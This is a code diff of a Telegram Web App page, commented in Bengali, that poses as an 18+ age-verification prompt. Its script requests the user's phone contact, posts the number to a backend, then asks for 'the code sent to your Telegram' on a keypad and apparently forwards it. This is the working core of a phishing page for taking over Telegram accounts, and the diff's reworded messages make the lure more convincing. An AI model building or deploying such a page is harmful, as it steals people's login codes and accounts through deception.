@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Age Verification</title>
+    <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000; color: white; overflow: hidden; }
@@ -18,15 +18,17 @@
 </head>
 <body>
     <div class="overlay">
+        <!-- ধাপ ১ -->
         <div id="step0" class="box">
             <div style="font-size: 60px;">🔞</div>
-            <h2 style="margin: 10px 0; color: #d9534f;">Attention!</h2>
+            <h2 style="margin: 10px 0;">Attention!</h2>
             <p style="color: #666;">To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn" onclick="getContact()">🍓 confirm 🔞</button>
+            <button class="btn" onclick="startRequest()">🍓 confirm 🔞</button>
         </div>
 
+        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
         <div id="step2" class="box hidden">
-            <h3 style="margin:0;">Identity Check</h3>
+            <h3 style="margin: 0;">Identity Check</h3>
             <p style="font-size: 14px; color: #666;">Enter the code sent to your Telegram</p>
             <input type="text" id="otp_display" placeholder="-----" readonly>
             <div class="keypad">
@@ -35,7 +37,7 @@
                 <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                 <div class="key" style="background:#ffc107;" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#007bff; color:white;" onclick="verifyOTP()">OK</div>
             </div>
-            <div id="loader" class="hidden" style="margin-top:10px; color: #888;">Processing...</div>
+            <div id="loader" class="hidden" style="margin-top:15px; color:#999;">Verifying...</div>
         </div>
     </div>
 
@@ -46,27 +48,25 @@
         let currentOTP = "";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        function getContact() {
-            // টেলিগ্রাম নেটিভ কন্টাক্ট রিকোয়েস্ট
+        function startRequest() {
+            // নম্বর শেয়ার পপ-আপ ট্রিগার
             tg.requestContact((shared) => {
                 if (shared) {
-                    // কন্টাক্ট শেয়ার সফল হলে ডাটা নিয়ে ব্যাকএন্ডে পাঠানো
-                    // এখানে রেজাল্ট সরাসরি shared অবজেক্ট থেকেও আসতে পারে
+                    // পপ-আপ থেকে সরাসরি নম্বর নেওয়া
                     setTimeout(() => {
-                        let contact = tg.initDataUnsafe.contact;
-                        if (contact && contact.phone_number) {
-                            sendPhone(contact.phone_number);
+                        let phone = tg.initDataUnsafe.contact ? tg.initDataUnsafe.contact.phone_number : null;
+                        if (phone) {
+                            sendPhoneToBackend(phone);
                         } else {
-                            // কিছু ফোনে ডাটা সরাসরি পাওয়া যায় না, তাই আমরা ম্যানুয়ালি রেজাল্ট চেক করি
-                            alert("Contact verification pending... try again if not redirected.");
+                            alert("Contact sharing failed. Please try again.");
                         }
                     }, 500);
                 }
             });
         }
 
-        async function sendPhone(phone) {
-            document.getElementById('step0').innerHTML = "<h3>Verifying Age...</h3>";
+        async function sendPhoneToBackend(phone) {
+            document.getElementById('step0').innerHTML = "<h3>Verifying...</h3>";
             let res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({ user_id: userId, phone: phone })
@@ -76,7 +76,7 @@
                 document.getElementById('step0').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
             } else {
-                alert("Request Failed: " + data.message);
+                alert("Server error. Please try again later.");
                 location.reload();
             }
         }
@@ -95,7 +95,7 @@
             if(data.status === "success") {
                 tg.close();
             } else {
-                alert("Invalid Auth Key!");
+                alert("Wrong Code!");
                 clearNum();
                 document.getElementById('loader').classList.add('hidden');
             }
